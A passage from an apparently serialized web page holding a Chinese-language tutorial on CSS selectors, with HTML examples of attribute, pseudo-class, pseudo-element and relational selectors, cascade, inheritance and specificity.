type="text/css">\n        input[type="text"]::selection { background:gray; color:#FFF; }\n        p::selection { background:red; color:#FFF; }\n    </style>\n</head>\n<body>\n    <p>这是一段测试文字</p>\x3c!--鼠标选中一部分文字时，选中区域是红色的--\x3e\n    <input type="text" value="这是一段测试文字" />\x3c!--鼠标选中一部分文字时，选中区域是灰色的--\x3e\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# 五、关系选择器\n\n\n# 5. 后代选择器\n\n后代选择器是用单个空格来组合多个选择器，这些被组合起来的选择器是祖先与后代的关系。\n\n<html>\n<head>\n    <style type="text/css">\n        .box p { color: red; }  \n    </style>\n</head>\n<body>\n    <div class="box"><p>Text in .box</p></div>\n    <p>Text not in .box</p>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n\n# 5.2 子代关系选择器\n\n子代关系选择器是用大于号来组合元素与它的直接子元素的。\n\n<html>\n<head>\n    <style type="text/css">\n        .ulc > li {  border-top: 5px solid red; }  \n    </style>\n</head>\n<body>\n    <ul class="ulc">\n        <li>Unordered item</li> \x3c!--有上边框--\x3e\n        <li>Unordered item      \x3c!--有上边框--\x3e\n            <ul>\n                <li>Item 1</li> \x3c!--没有边框--\x3e\n                <li>Item 2</li> \x3c!--没有边框--\x3e\n            </ul>\n        </li>\n    </ul>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n\n# 5.3 邻接兄弟选择器\n\n邻接兄弟选择器是用加号来选中同级的邻接兄弟元素（下一个）。\n\n<html>\n<head>\n    <style type="text/css">\n        h1 + p { color: red; }\n    </style>\n</head>\n<body>\n    <article>\n        <h1>标题</h1>\n        <p>文章段落1</p>\x3c!--文字红色--\x3e\n        <p>文章段落2</p>\n    </article>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n\n# 5.4 通用兄弟选择器\n\n通用兄弟选择器是用波浪号来选中同级的某类兄弟元素，不管是否紧挨着。\n\n<html>\n<head>\n    <style type="text/css">\n        h1 ~ p { color: red; }\n    </style>\n</head>\n<body>\n    <article>\n        <h1>A heading</h1>\n        <p>I am a paragraph.</p>\x3c!--文字红色--\x3e\n        <div>I am a div</div>\n        <p>I am another paragraph.</p>\x3c!--文字红色--\x3e\n    </article>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n\n# 六、层叠与继承\n\n\n# 6.1 层叠和继承的简述\n\ncss的首字母cascade，也就是层叠的意思。你可以对同一个元素使用多个css样式，规则相同（同一优先级）时前面写的样式会被后面写的样式覆盖掉，如果规则（优先级）不同，即使写在前面也是优先级高的生效。\n\n<html>\n<head>\n    <style type="text/css">\n      h1 {\n        color: red;\n      }\n      h1 {\n        color: blue;\n      }\n    </style>\n</head>\n<body>\n    \x3c!-- 两个样式同规则，最后一个生效，蓝色 --\x3e\n    <h1>This is my heading.</h1>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n样式也可以继承，具体来说是设置在父元素上的css属性是可以被子元素继承的。\n\n<html>\n<head>\n    <style type="text/css">\n      ul {\n        color: red;\n      }\n    </style>\n</head>\n<body>\n    <ul>\n        <li>111</li>\x3c!-- 继承ul的颜色：红色 --\x3e\n        <li>222</li>\x3c!-- 继承ul的颜色：红色 --\x3e\n        <li>333</li>\x3c!-- 继承ul的颜色：红色 --\x3e\n    </ul>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n\n# 6.2 继续了解css继承\n\n有些样式是可以继承的，但有些样式是不可以的，比如width、margin、padding和border等，像最最基础的font和color这些非常常用就会让它们可以被继承，而一些宽度、边框、比距要是能继承那在操作子元素时会非常麻烦，这些属性在一些场景下都是使用默认值。\n\n<html>\n<head>\n    <style type="text/css">\n        .main {\n            color: red;\n            border: 2px solid #ccc;\n            padding: 1em;\n        }\n        .special {\n            font-weight: bold;\n        }\n    </style>\n</head>\n<body>\n    <ul class="main">\n        <li>111</li>\n        <li>222</li>\n        <li>333\n            \x3c!--继承了父元素的红色，但是border和padding继承不了--\x3e\n            <ul class="special">\n                <li>444</li>\n                <li>555</li>\n            </ul>\n        </li>\n    </ul>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\n可以看到最外层的ul是有边框和边距的，内层的ul就没有继承这两个属性，只继承了颜色。注意：千万别把.main替换成ul，这样就不是讨论继承了，这是对所有ul设置一样的样式。\n\n为了控制继承，css为属性提供了四个通用值：\n\n * initial：使用浏览器默认样式\n * inherit：继承父元素\n * unset：属性默认是可继承就为inherit否则为initial，其实一般默认不可继承\n * revert：还原，会使用用户定义样式表，其他情况跟unset差不多。链接。\n\n这个四个通用属性值一般用于单个属性上，其实也可以对一个元素所有样式进行控制，也就是使用all这个属性:\n\n<html>\n<head>\n    <style type="text/css">\n        div {\n            background-color: red;\n            border: 2px solid green;\n        }\n        .fix-this {\n            all: unset;\n        }\n    </style>\n</head>\n<body>\n    <div>\n        <p>This blockquote is styled</p>\n    </div>\n    \x3c!--all: unset，回到最初的样式，也就是浏览器默认样式--\x3e\n    <div class="fix-this">\n        <p>This blockquote is not styled</p>\n    </div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\n\n# 6.3 继续了解层叠\n\n我们回过头来说层叠，规则不同会影响同一元素的显示效果，即使优先级高的代码靠前也不会被后面低优先级的覆盖。那么优先级是如何计算的呢？其实不同类型的选择器有不同的分数值，把目标元素的某一个样式中使用的选择器加起来就可以进行比较优先级了。\n\n 1. 千位： 样式定义在元素的style属性上，则得一千分。\n 2. 百位： 选择器中包含ID选择器，则得一百分。\n 3. 十位： 选择器中包含类选择器、属性选择器或者伪类，则得十分。\n 4. 个位： 选择器中包含元素选择器、伪元素选择器，则得一分。\n\n例如：\n\n选择器                                       千位   百位   十位   个位   优先级\nh1                                        0    0    0    1    0001\nh1 + p::first-letter                      0    0    0    3    0003\nli > a[href*="en-US"] > .inline-warning   0    0    2    2    0022\n#identifier                               0    1    0    0    0100\n内联样式                                      1    0    0    0    1000\n\n<html>\n<head>\n    <style type="text/css">\n        #outer a {          /* specificity: 0101 */\n            background-color: red;\n        }\n        #outer #inner a {   /* specificity: 0201 */\n            background-color: blue;\n        }\n        #outer div ul li a { /* specificity: 0104 */\n            color: yellow;\n        }\n        /* specificity: 0113 */\n        #outer div ul .nav a { color: white; }\n        /* specificity: 0024 */\n        div div li:nth-child(2) a:hover { border: 10px solid black; }\n        /* specificity: 0023 */\n        div li:nth-child(2) a:hover { border: 10px dashed black; }\n        /* specificity: 0033 */\n        div div .nav:nth-child(2) a:hover { border: 10px double black; }\n        a { display: inline-block; line-height: 40px; font-size: 20px; text-decoration: none;\n            text-align: center; width: 200px; margin-bottom: 10px; }\n        ul { padding: 0; }\n        li { list-style-type: none; }\n    </style>\n</head>\n<body>\n    <div id="outer" class="container">\n      <div id="inner" class="container">\n          <ul>\n              <li class="nav"><a href="#">One</a></li>\x3c!-- 0201分获胜，蓝色 --\x3e\n              <li class="nav"><a href="#">Two</a></li>\x3c!-- 0201分获胜，蓝色 --\x3e\n          </ul>\n      </div>\n  </div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n\n\n!important这个属性设置会覆盖原有的优先级（针对属性），尽管我这条样式的优先级很低，但我样式中的属性使用了!important，那么其他地方的样式中的这个属性只能听我的。\n\n<html>\n<head>\n    <style type="text/css">\n        #winning { background-color: red; border: 1px solid black; }\n        .better { background-color: gray; border: none !important; }\n        p { background-color: blue; color: white; padding: 5px; }\n    </style>\n</head>\n<body>\n    <p class="better">This is a paragraph.</p>\n    <p class="better" id="winning">One selector to rule them all!</p>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n上面这个例子逐步分析：\n\n * 初步分析p标签应该是蓝底白字；\n * 因为类选择器的缘故应该是灰底白字没有边框；\n * 而第二个<p>单独使用了ID选择器，那么第二个<p>应该是红底白字有边框；\n * border曾设置过!important，那么即使ID选择器优先级高也不能忽视低优先级类选择器里设置的!important，所以第二个<p>也无边框。\n\n注意：不到万不得已不要使用!important，它打乱了优先级，覆盖已有的!important又要在同优先级或高优先级使用!important来抵消，要是其他地方也要改也要这样设置。',normalizedContent:'# 选择器\n\n\n# 一、选择器是什么\n\n选择器一览表\n\n选择器用来指定页面上我们想要样式化的html元素，是css中获取html元素的一种手段。在简介了就提过css的基本语法选择器 {样式属性: 值}，就是告诉浏览器你的这个页面的那个元素要设置什么样式，所以选择器的学习很重要。\n\n前面使用过简单的选择器，其实选择器完整的形式是这样的：e[foo=val]，e是标签，foo通常是属性，val是属性值。例如：div[id="div_big"]是选择了页面中id为"div_big"的div元素。如果选择器写错了（语法错误），那么选择器的这条样式是失效的。\n\n\n# 二、属性选择器\n\n\n# 2.1 一般的属性选择器\n\n可以给html元素添加属性，比如id和class等一些自定义属性（别忘了id的优先级更高哦），然后就可以通过属性选择器对元素进行样式添加。属性选择器的写法就是[att=val]，其中att是属性，val是属性值。对了，别搞混css样式属性和html元素属性，根本就不是一个的东西。\n\n<html>\n<head>\n    <style type="text/css">\n        /* id属性（html元素属性），section是值， background-color是css样式属性，yellow是值 */\n        [id=section] { background-color: yellow; }\n    </style>\n</head>\n<body>\n    <div id="section">示例文本</div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n\n# 2.2 搭配通配符使用\n\n在使用选择器的使用可以加上~、|、*、^、?、$等通配\n\n[att~=val]：如果att属性的值就是val或者空格隔开的val，那么就选择这个属性所在的元素。例如：选择器是[id~=section]，那么id为"section"、"section search"的元素都会被选中。\n\n[att|=val]：如果att属性的值就是val或者以val开头再接一个连字符，那么就选择这个属性所在的元素。例如：选择器是[id|=zh]，那么id为"zh"、"zh-xxx"的元素都会被选中。\n\n[att*=val]：如果att属性的值中包含val，那么就选择这个属性所在的元素。例如：选择器是[id*=section]，那么id为"0section123"、"1section-456"的元素都会被选中。\n\n[att^=val]：如果att属性的值开头是val，那么就选择这个属性所在的元素。例如：选择器是[id^=section]，那么id为"section12"、"section-46"的元素都会被选中。\n\n[att$=val]：如果att属性的值结尾是val，那么就选择这个属性所在的元素。例如：选择器是[id$=section]，那么id为"12section"、"div_section"的元素都会被选中。如果是-1结尾的记得要在选择器中转义，[id$=\\-1]。\n\n<html>\n<head>\n    <style type="text/css">\n        li[class] { font-size: 200%; }\n        li[class="a"] { background-color: yellow; }\n        li[class~="a"] { color: red; }\n        li[class|="zh"] { color: green; }\n    </style>\n</head>\n<body>\n    <ul>\n        <li>item 1</li>\x3c!--没有样式--\x3e\n        <li class="a">item 2</li>\x3c!--黄底红字--\x3e\n        <li class="a b">item 3</li>\x3c!--红字--\x3e\n        <li class="zh">item 4</li>\x3c!--绿字--\x3e\n        <li class="zh-b">item 5</li>\x3c!--绿字--\x3e\n    </ul>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n下面的例子是给以/结尾和以html结尾的a标签的末尾添加红色文字，给以jpg结尾的添加绿色文字\n\n<html>\n<head>\n    <style type="text/css">\n        a[href$=\\/]:after, a[href$=html]:after { content: "web网页"; color: red; }\n        a[href$=jpg]:after { content: "jpeg图像文件"; color: green; }\n    </style>\n</head>\n<body>\n    <a href="http://css3/">示例文本</a>\x3c!--后面添加了红色文字--\x3e\n    <a href="http://css3/css3.html">示例文本</a>\x3c!--后面添加了红色文字--\x3e\n    <a href="photo.jpg">示例文本</a>\x3c!--后面添加了绿色文字--\x3e\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n\n# 2.3 大小写敏感\n\n如果想在大小写不敏感的情况下匹配属性值的话，你可以在[]里面的末尾加上i。\n\n<html>\n<head>\n    <style type="text/css">\n        li[class^="a"] { background-color: yellow; }\n        li[class^="a" i] { color: red; }\n    </style>\n</head>\n<body>\n    <ul>\n        <li class="a">item 1</li>\x3c!--黄底红字--\x3e\n        <li class="a">item 2</li>\x3c!--仅红字--\x3e\n        <li class="ab">item 3</li>\x3c!--仅红字--\x3e\n    </ul>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n\n# 三、伪类选择器\n\n伪类选择器是用来选择处于特定状态或特定结构下的元素，特定状态或结构的名字在css中已经定义好了。实际上是对页面上现存的元素进行操作，行为比较像类选择器。伪类是以冒号为开头的，:xxx。\n\n\n# 3.1 常见的结构性伪类\n\n有4个常见的结构性伪类选择器：root、not、empty和target。\n\n# root\n\nroot选取页面的根元素，根元素是指位于页面最顶层结构的元素，一般是整个页面的<html>部分。\n\n<html>\n<head>\n    <style type="text/css">\n        :root { background-color: yellow; } /* 整个页面底色是黄色 */\n        body { background-color: limegreen; } /* 而body是绿色 */\n    </style>\n</head>\n<body>\n    <h2>选择器是什么</h2>\n    <p>选择器是css中获取页面元素的一种手段，可以将样式与元素直接绑定起来，还可以实现各种复杂的指定，能精简样式表的代码量...</p>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n# not\n\nnot是为了排除元素的某些子元素。\n\n<html>\n<head>\n    <style type="text/css">\n        body *:not(h2){ background-color: yellow; } /* body都是黄色但除了h2元素 */\n    </style>\n</head>\n<body>\n    <h2>选择器是什么</h2>\n    <p>选择器是css中获取页面元素的一种手段，可以将样式与元素直接绑定起来，还可以实现各种复杂的指定，能精简样式表的代码量...</p>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n# empty\n\nempty是选取元素中内容为空白的区域或者没有子元素的元素。\n\n<html>\n<head>\n    <style type="text/css">\n        :empty { background-color: yellow; }\n    </style>\n</head>\n<body>\n    <table border="1" cellpadding="0" cellspacing="0">\n        <tr><td>a</td><td>b</td><td>c</td></tr>\n        <tr><td>d</td><td>e</td><td></td></tr>\x3c!--最后一项没有内容，并且背景是黄色的--\x3e\n    </table>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n# target\n\ntarget是选取页面中url目标元素，点击超链接会跳转到target元素，然后:target就会起作用。类似于文章中的标题跳转到对应内容。\n\n<html>\n<head>\n    <style type="text/css">\n        :target { background-color: yellow; }\n    </style>\n</head>\n<body>\n    <p id="menu">\n        <a href="#text1">示例文字1</a> |\x3c!--点击超链接就会跳转到对应id的元素上--\x3e\n        <a href="#text2">示例文字2</a> |\n        <a href="#text3">示例文字3</a> |\n    </p>\n    <div id="text1"><h2>示例文字1</h2><p>...此处略去</p></div>\x3c!--跳转到这里后变为黄色--\x3e\n    <div id="text2"><h2>示例文字2</h2><p>...此处略去</p></div>\n    <div id="text3"><h2>示例文字3</h2><p>...此处略去</p></div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n\n# 3.2 处理子元素\n\n可以对一个父元素中的第一个、最后一个、指定序号、第偶数个、第奇数个子元素进行样式的指定，通用写法子元素名称:xxx-child。\n\n# first-child、last-child\n\nfirst-child对父元素的第一个子元素进行指定样式（其实一般要配合使用才算是第一个子元素，例如ul li:first-child）。\n\nlast-child对父元素的最后一个子元素进行指定样式。\n\n<html>\n<head>\n    <style type="text/css">\n        /*.ul1元素的直接子元素，并且是第一个元素也是li元素*/\n        .ul1 > li:first-child { background-color: yellow; }\n        /*父元素中的最后一个元素并且是li元素*/\n        li:last-child { background-color: skyblue; }\n    </style>\n</head>\n<body>\n    <ul class="ul1">\n        <li>项目列表1</li>\x3c!--黄色，“>”配合first-child可以只改变第一层的第一个li--\x3e\n        <li>项目列表2\n            <ul>\n                <li>项目列表2-1</li>\x3c!--没有改变--\x3e\n                <li>项目列表2-2</li>\n                <li>项目列表2-3</li>\n                <li>项目列表2-4</li>\x3c!--浅蓝色--\x3e\n            </ul>\n        </li>\n        <li>项目列表3</li>\n        <li>项目列表4</li>\x3c!--浅蓝色，不加“>”限制的话就是所有的最后一项li--\x3e\n    </ul>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n# nth-child、nth-last-child\n\nnth-child对父元素的第几个子元素进行指定样式。\n\nnth-last-child对父元素的倒数第几个子元素进行指定样式。\n\n<html>\n<head>\n    <style type="text/css">\n        .ul1 > li:nth-child(1) { background-color: yellow; }\n        li:nth-last-child(2) { background-color: skyblue; }\n    </style>\n</head>\n<body>\n    <ul class="ul1">\n        <li>项目列表1</li>\x3c!--黄色，“>”配合nth-child可以只改变第一层的第一个li--\x3e\n        <li>项目列表2\n            <ul>\n                <li>项目列表2-1</li>\x3c!--没有改变--\x3e\n                <li>项目列表2-2</li>\n                <li>项目列表2-3</li>\x3c!--浅蓝色--\x3e\n                <li>项目列表2-4</li>\n            </ul>\n        </li>\n        <li>项目列表3</li>\x3c!--浅蓝色，不加“>”限制的话就是所有的倒数第二项li--\x3e\n        <li>项目列表4</li>\n    </ul>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\nnth-child和nth-last-child还可以对父元素中第奇数个或偶数个子元素使用样式。\n\n<html>\n<head>\n    <style type="text/css">\n        .ul1 > li:nth-child(odd) { background-color: yellow; }\n        li:nth-child(even) { background-color: skyblue; }\n    </style>\n</head>\n<body>\n    <ul class="ul1">\n        <li>项目列表1</li>\x3c!--黄色，“>”配合first-child可以只改变第一层的奇数项li--\x3e\n        <li>项目列表2       \x3c!--浅蓝色--\x3e\n            <ul>\n                <li>项目列表2-1</li>\x3c!--浅蓝色，因为父元素是浅蓝色--\x3e\n                <li>项目列表2-2</li>\x3c!--浅蓝色--\x3e\n                <li>项目列表2-3</li>\x3c!--浅蓝色--\x3e\n                <li>项目列表2-4</li>\x3c!--浅蓝色--\x3e\n            </ul>\n        </li>\n        <li>项目列表3</li>\x3c!--黄色，“>”配合first-child可以只改变第一层的奇数项li--\x3e\n        <li>项目列表4</li>\x3c!--浅蓝色，不加“>”限制的话就是所有的最后一项li--\x3e\n    </ul>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\nnth-child和nth-last-child的使用其实还有个问题，比如p:nth-child(odd)，它的意思是父元素的奇数项并且是p元素，而不是父元素的第奇数个p元素，因为父元素的子元素可能是多种类型的元素，这两种选择器就是第几项并且是xxx元素，这一点一定要分清楚的。\n\n<html>\n<head>\n    <style type="text/css">\n        h2:nth-child(odd) { background-color: yellow; }/*解释起来就是父元素中的奇数项并且是h2元素*/\n        h2:nth-child(even) { background-color: skyblue; }/*解释起来就是父元素中的偶数项并且是h2元素*/\n    </style>\n</head>\n<body>\n    <h2>文章标题1</h2>\x3c!--黄色，父元素奇数项并且是h2元素--\x3e\n    <p>文章正文1</p>\x3c!--无颜色，父元素偶数项但是是p元素--\x3e\n    <h2>文章标题2</h2>\x3c!--黄色，父元素奇数项并且是h2元素--\x3e\n    <p>文章正文2</p>\x3c!--无颜色，父元素偶数项但是是p元素--\x3e\n    <h2>文章标题3</h2>\x3c!--黄色，父元素奇数项并且是h2元素--\x3e\n    <p>文章正文3</p>\x3c!--无颜色，父元素偶数项但是是p元素--\x3e\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n# nth-of-type、nth-last-of-type\n\n因为nth-child和nth-last-child的问题，我们可以选择nth-of-type和nth-last-of-type。\n\nnth-of-type对父元素里同类型子元素的第几项进行指定样式。\n\nnth-last-of-type对父元素里同类型子元素的倒数第几项进行指定样式。\n\n<html>\n<head>\n    <style type="text/css">\n        h2:nth-of-type(odd) { background-color: yellow; }\n        h2:nth-of-type(even) { background-color: skyblue; }\n    </style>\n</head>\n<body>\n    <h2>文章标题1</h2>\x3c!--黄色，父元素里的h2元素奇数项--\x3e\n    <p>文章正文1</p>\n    <h2>文章标题2</h2>\x3c!--浅蓝色，父元素里的h2元偶数项--\x3e\n    <p>文章正文2</p>\n    <h2>文章标题3</h2>\x3c!--黄色，父元素里的h2元素奇数项--\x3e\n    <p>文章正文3</p>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n# nth-child的循环使用\n\n**nth-child(an+b)**可以对父元素里的子元素进行样式的循环使用，特别适合父元素里元素繁多的场景；a表示每次循环中共包括几种样式，b表示指定的样式在循环中所处的位置。\n\n<html>\n<head>\n    <style type="text/css">\n        li:nth-child(4n+1) { background-color: yellow; }\n        li:nth-child(4n+2) { background-color: limegreen; }\n        li:nth-child(4n+3) { background-color: red; }\n        li:nth-child(4n+4) { background-color: white; }\n    </style>\n</head>\n<body>\n    <ul class="ul1">\n        <li>项目列表1</li>\x3c!--黄色--\x3e\n        <li>项目列表2       \x3c!--绿色--\x3e\n            <ul>\n                <li>项目列表2-1</li>\x3c!--黄色--\x3e\n                <li>项目列表2-2</li>\x3c!--绿色--\x3e\n                <li>项目列表2-3</li>\x3c!--红色--\x3e\n                <li>项目列表2-4</li>\x3c!--白色--\x3e\n            </ul>\n        </li>\n        <li>项目列表3</li>\x3c!--红色--\x3e\n        <li>项目列表4</li>\x3c!--白色--\x3e\n        <li>项目列表5</li>\x3c!--黄色--\x3e\n        <li>项目列表6</li>\x3c!--绿色--\x3e\n        <li>项目列表7</li>\x3c!--红色--\x3e\n        <li>项目列表8</li>\x3c!--白色--\x3e\n    </ul>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\n# only-child\n\n对父元素里只有一个元素时使用的样式，可以采用子元素:nth-child(1):nth-last-child(1)，也可以使用子元素:only-child\n\n<html>\n<head>\n    <style type="text/css">\n        li:only-child { background-color: yellow; }\n        /*li:nth-child(1):nth-last-child(1) { background-color: yellow; }*/\n    </style>\n</head>\n<body>\n    <h2>ul列表a</h2>\n    <ul>\n        <li>列表项目a1</li>\x3c!--黄色--\x3e\n    </ul>\n    <h2>ul列表b</h2>\n    <ul>\n        <li>列表项目b1</li>\x3c!--无色--\x3e\n        <li>列表项目b2</li>\x3c!--无色--\x3e\n        <li>列表项目b3</li>\x3c!--无色--\x3e\n    </ul>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n\n# 3.3 状态伪类选择器\n\n状态伪类选择器是对ui元素某种状态下的一种伪类选择器，在默认状态下是不起作用的。\n\n# hover、active、focus\n\nhover为鼠标指针悬浮“头顶”的元素指定样式。\n\nactive为处于激活状态（例如鼠标按下）的元素指定样式。\n\nfocus为已获取焦点的元素指定样式。\n\n<html>\n<head>\n    <style type="text/css">\n        input[type="text"]:hover { background-color: blue; }\n        input[type="text"]:focus { background-color: red; }\n        input[type="text"]:active { background-color: yellow; }\n    </style>\n</head>\n<body>\n    <form>\n    <p>姓名：<input type="text" name="name" /></p>\x3c!--鼠标悬浮时蓝色，获得焦点时红色，按住时黄色--\x3e\n    <p>地址：<input type="text" name="address" /></p>\x3c!--鼠标悬浮时蓝色，获得焦点时红色，按住时黄色--\x3e\n    </form>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n# enabled、disabled\n\nenabled为处于可用状态下的元素指定样式。\n\ndisabled为处于禁用状态下的元素指定样式。\n\n<html>\n<head>\n    <script>\n    const change = () => {\n        const radio = document.getelementbyid("radio1");\n        const text = document.getelementbyid("text");\n        text.disabled = radio.checked ? "" : "disabled";\n    };\n    <\/script>\n    <style type="text/css">\n        input[type="text"]:enabled { background-color: yellow; }\n        input[type="text"]:disabled { background-color: red; }\n    </style>\n</head>\n<body>\n    <form>\n        <input type="radio" id="radio1" name="radio" onchange="change()"/>可用<br/>\n        <input type="radio" id="radio2" name="radio" onchange="change()" checked />不可用<br/>\n        <input type="text" id="text" disabled />\x3c!--禁用时是红色的，可用时是黄色的--\x3e\n    </form>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\n# read-only、read-write\n\nread-only为处于只读状态下的元素指定样式。\n\nread-write为处于可读及可写状态下的元素指定样式。\n\n<html>\n<head>\n    <style type="text/css">\n        input[type="text"]:read-only { background-color: gray; }\n        input[type="text"]:read-write { background-color: yellow; }\n    </style>\n</head>\n<body>\n    <form>\n        <p>姓名：<input type="text" name="name" /></p>\x3c!--可读及可写是黄色的--\x3e\n        <p>地址：<input type="text" name="address" value="上海" readonly="readonly"/></p>\x3c!--只读是灰色的--\x3e\n    </form>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n# indeterminate\n\nindeterminate为打开页面时单选框或多选框中**没有一个选项被选中（未定状态）**时指定整个元素的样式。\n\n<html>\n<head>\n    <style type="text/css">\n        input[type="radio"]:indeterminate { outline:3px solid red; }\n    </style>\n</head>\n<body>\n    <form>\n        性别：<br/>\n        <input type="radio" name="radio" value="male" />男\x3c!--进入页面没有一项是被选中的，那么都为红色边框--\x3e\n        <input type="radio" name="radio" value="femal" />女\n    </form>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n# invalid、valid\n\ne:valid为处于处于合法状态下的元素指定样式。\n\ne:invalid为处于处于非法状态下的元素指定样式。\n\n<html>\n<head>\n    <style type="text/css">\n        input[type="text"]:valid { background:white; }\n        input[type="text"]:invalid { background:red; }\n    </style>\n</head>\n<body>\n    <p>请输入任意文字：<input type="text" required /></p>\x3c!--输入文字时白色，没有输入时红色--\x3e\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n# required、optional\n\nrequired为已设置了必填属性的元素指定样式。\n\noptional为没有设置必填的元素（选填）指定样式。\n\n<html>\n<head>\n    <style type="text/css">\n        input[type="text"]:required { border-color: red; border-width:3px; }\n        input[type="text"]:optional { border-color: black; border-width:1px; }\n    </style>\n</head>\n<body>\n    <form>\n        <p>姓名：<input type="text" required placeholder="必须输入姓名" /></p>\x3c!--必填项为红色框--\x3e\n        <p>地址：<input type="text" /></p>\x3c!--选填项为黑色框--\x3e\n    </form>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n# in-range、out-of-range\n\nin-range为处于有效值的元素指定样式。\n\nout-of-range为处于失效值的元素指定样式。\n\n<html>\n<head>\n    <style type="text/css">\n        input[type="number"]:in-range { background-color: white; }\n        input[type="number"]:out-of-range { background-color: red; border-width:1px; }\n    </style>\n</head>\n<body>\n    <form>\n        输入1到100之间的数值：<input type="number" min=0 max=100 />\x3c!--数值超过范围就会显示红色--\x3e\n    </form>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n\n# 四、伪元素选择器\n\n伪元素选择器针对的是元素中的一部分来定义样式，而不是真实元素本身整个整体，因为那一部分并不能用html标签表示；和伪类选择器一样是css中已经定义好的选择器，不能随便取名。使用方法就是元素::伪元素 {样式属性:值}或者元素.类名::伪元素 {样式属性:值}，其实早期是使用单冒号的，现在你可能会看到一部分伪元素是使用单冒号（向前兼容）。\n\n\n# first-line、first-letter\n\nfirst-line用于向某个元素中的第一行文字使用样式。\n\nfirst-letter用于向某个元素中文字的首字母或第一个字使用的样式。\n\n<html>\n<head>\n    <style type="text/css">\n        p#text1::first-line { color: #0000ff }\n        p#text2::first-letter { color: #0000ff }\n        p#text3::first-letter { color: #0000ff }\n    </style>\n</head>\n<body>\n    <p id="text1">段落中的第一行。<br>段落中的第二行。</p>\x3c!--段落中第一行为蓝色--\x3e\n    <p id="text2">this is an english text.</p>\x3c!--首字母为蓝色--\x3e\n    <p id="text3">这是一段中文文字。</p>\x3c!--第一个字为蓝色--\x3e\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n\n# before、after\n\nbefore用于在某个元素之前插入一些内容。用法就是元素::before { content: 插入内容 }。\n\nafter用于在某个元素之后插入一些内容。用法就是元素::after { content: 插入内容 }。\n\n<html>\n<head>\n    <style type="text/css">\n        li::before { content: "###"; }\n        li::after { content: "(仅用于测试，请勿用于商业用途。)"; font-size: 12px; color: red; }\n    </style>\n</head>\n<body>\n    <ul>\n        <li><a 